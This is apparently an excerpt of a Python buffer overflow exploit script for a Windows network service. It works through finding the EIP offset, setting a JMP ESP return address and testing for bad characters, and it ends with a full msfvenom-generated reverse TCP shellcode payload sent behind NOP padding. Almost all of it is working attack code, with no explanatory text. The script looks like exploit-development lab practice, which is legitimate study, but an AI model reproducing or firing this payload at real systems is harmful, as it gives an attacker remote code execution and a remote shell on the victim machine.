...
def check_ip():
	crash="A"*2002+"BBBB"+"C"*1000
	send_data(crash)

# 625011AF
eip_addr="\xaf\x11\x50\x62"

def jmpesp():
	crash="A"*2002+eip_addr+"C"*1000
	send_data(crash)
...
def bad_chars():
	...
	crash="A"*2002+eip_addr+"\x90"*10+badchars+"C"*123
	send_data(crash)

# msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -n 20 -f python
buf =  ""
buf += "\x2f\x43\x2f\xfc\xf8\x37\xf9\x9b\xf9\xf5\x93\x2f\xfd"
buf += "\xfd\x92\x9b\x41\x91\x99\x48\xbb\x0c\x42\xe8\xa0\xd9"
buf += "\xc0\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x52\x31\x58\x12"
buf += "\x83\xc0\x04\x03\x54\x4c\x0a\x55\x98\xb8\x48\x96\x60"
buf += "\x39\x2d\x1e\x85\x08\x6d\x44\xce\x3b\x5d\x0e\x82\xb7"
buf += "\x16\x42\x36\x43\x5a\x4b\x39\xe4\xd1\xad\x74\xf5\x4a"
buf += "\x8d\x17\x75\x91\xc2\xf7\x44\x5a\x17\xf6\x81\x87\xda"
buf += "\xaa\x5a\xc3\x49\x5a\xee\x99\x51\xd1\xbc\x0c\xd2\x06"
buf += "\x74\x2e\xf3\x99\x0e\x69\xd3\x18\xc2\x01\x5a\x02\x07"
buf += "\x2f\x14\xb9\xf3\xdb\xa7\x6b\xca\x24\x0b\x52\xe2\xd6"
buf += "\x55\x93\xc5\x08\x20\xed\x35\xb4\x33\x2a\x47\x62\xb1"
buf += "\xa8\xef\xe1\x61\x14\x11\x25\xf7\xdf\x1d\x82\x73\x87"
buf += "\x01\x15\x57\xbc\x3e\x9e\x56\x12\xb7\xe4\x7c\xb6\x93"
buf += "\xbf\x1d\xef\x79\x11\x21\xef\x21\xce\x87\x64\xcf\x1b"
buf += "\xba\x27\x98\xe8\xf7\xd7\x58\x67\x8f\xa4\x6a\x28\x3b"
buf += "\x22\xc7\xa1\xe5\xb5\x28\x98\x52\x29\xd7\x23\xa3\x60"
buf += "\x1c\x77\xf3\x1a\xb5\xf8\x98\xda\x3a\x2d\x0e\x8a\x94"
buf += "\x9e\xef\x7a\x55\x4f\x98\x90\x5a\xb0\xb8\x9b\xb0\xd9"
buf += "\x53\x66\x53\x99\xa3\x68\xa2\x0d\xa6\x68\xb5\x91\x2f"
buf += "\x8e\xdf\x39\x66\x19\x48\xa3\x23\xd1\xe9\x2c\xfe\x9c"
buf += "\x2a\xa6\x0d\x61\xe4\x4f\x7b\x71\x91\xbf\x36\x2b\x34"
buf += "\xbf\xec\x43\xda\x52\x6b\x93\x95\x4e\x24\xc4\xf2\xa1"
buf += "\x3d\x80\xee\x98\x97\xb6\xf2\x7d\xdf\x72\x29\xbe\xde"
buf += "\x7b\xbc\xfa\xc4\x6b\x78\x02\x41\xdf\xd4\x55\x1f\x89"
buf += "\x92\x0f\xd1\x63\x4d\xe3\xbb\xe3\x08\xcf\x7b\x75\x15"
buf += "\x1a\x0a\x99\xa4\xf3\x4b\xa6\x09\x94\x5b\xdf\x77\x04"
buf += "\xa3\x0a\x3c\x34\xee\x16\x15\xdd\xb7\xc3\x27\x80\x47"
buf += "\x3e\x6b\xbd\xcb\xca\x14\x3a\xd3\xbf\x11\x06\x53\x2c"
buf += "\x68\x17\x36\x52\xdf\x18\x13"

def bof():	
	crash="A"*2002+eip_addr+buf+'\x90'*(3193 - len(buf))
	send_data(crash)	
